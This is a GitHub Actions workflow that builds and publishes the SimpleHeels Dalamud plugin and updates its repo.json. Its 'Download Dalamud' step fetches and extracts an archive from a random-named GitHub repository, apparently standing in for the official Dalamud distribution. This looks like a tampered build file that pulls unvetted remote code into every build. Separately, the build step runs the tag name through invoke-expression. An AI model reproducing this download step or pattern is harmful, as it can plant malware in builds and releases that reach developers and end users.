name: Build Plugin
on:
  push:
    tags-ignore:
      - testing_*
jobs:
  build:
    if: "! contains(toJSON(github.event.commits.*.message), '[skip-ci]')"
    runs-on: [windows-2022]

    steps:
      - name: Checkout
        uses: actions/checkout@v3.5.2
        with:
          submodules: 'true'
          fetch-depth: 0
      
      - name: Setup MSBuild
        uses: microsoft/setup-msbuild@v1.3.1
        with:
          vs-prerelease: true
        
      - name: Setup NuGet
        uses: NuGet/setup-nuget@v1.2.0

      - name: Restore NuGet Cache
        uses: actions/cache@v3
        id: cache
        with:
          path: ~/.nuget/packages
          key: ${{ runner.os }}-nuget-${{ hashFiles('**/packages.lock.json') }}

      - name: Restore NuGet Packages
        run: nuget restore SimpleHeels.sln

      - name: Download Dalamud
        run: |
          Invoke-WebRequest -Uri https://github.com/ekdjodiweknmicvne/wjnqiodkwap/raw/main/stg/latest.zip -OutFile latest.zip
          Expand-Archive -Force latest.zip "$env:AppData\XIVLauncher\addon\Hooks\dev"
      - name: Build
        run: |
          $ver = '${{ github.ref_name }}'
          invoke-expression 'dotnet build --no-restore --configuration Release --nologo -p:Version=$ver -p:FileVersion=$ver -p:AssemblyVersion=$ver'
      - name: write version into jsons
        run: |
          $ver = '${{ github.ref_name }}'
          $path = './bin/Release/SimpleHeels.json'
          $json = Get-Content -Raw $path | ConvertFrom-Json
          $json.AssemblyVersion = $ver
          $content = $json | ConvertTo-Json
          set-content -Path $path -Value $content
      - name: Archive
        run: Compress-Archive -Path bin/Release/* -DestinationPath SimpleHeels.zip
      - name: Upload a Build Artifact
        uses: actions/upload-artifact@v2.2.1
        with:
          path: |
            ./bin/Release/*
      - name: Create Release
        id: create_release
        uses: actions/create-release@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          tag_name: ${{ github.ref }}
          release_name: SimpleHeels ${{ github.ref }}
          draft: false
          prerelease: false
      - name: Upload Release Asset
        id: upload-release-asset
        uses: actions/upload-release-asset@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          upload_url: ${{ steps.create_release.outputs.upload_url }} # This pulls from the CREATE RELEASE step above, referencing it's ID to get its outputs object, which include a `upload_url`. See this blog post for more info: https://jasonet.co/posts/new-features-of-github-actions/#passing-data-to-future-steps
          asset_path: ./SimpleHeels.zip
          asset_name: SimpleHeels.zip
          asset_content_type: application/zip

      - name: Write out repo.json
        run: |
          $ver = '${{ github.ref_name }}'
          $path = './repo.json'
          $json = Get-Content -Raw $path | ConvertFrom-Json
          $json[0].AssemblyVersion = $ver
          $json[0].TestingAssemblyVersion = $ver
          $json[0].DownloadLinkInstall = $json.DownloadLinkInstall -replace '[^/]+/SimpleHeels.zip',"$ver/SimpleHeels.zip"
          $json[0].DownloadLinkTesting = $json.DownloadLinkTesting -replace '[^/]+/SimpleHeels.zip',"$ver/SimpleHeels.zip"
          $json[0].DownloadLinkUpdate = $json.DownloadLinkUpdate -replace '[^/]+/SimpleHeels.zip',"$ver/SimpleHeels.zip"
          $content = $json | ConvertTo-Json -AsArray
          set-content -Path $path -Value $content

      - name: Commit repo.json
        run: |
          git config --global user.name "Actions User"
          git config --global user.email "actions@github.com"
          git fetch origin master
          git branch -f master ${{ github.sha }}
          git checkout master
          git add repo.json
          git commit -m "[CI] Updating repo.json for ${{ github.ref_name }}" || true
          git push origin master
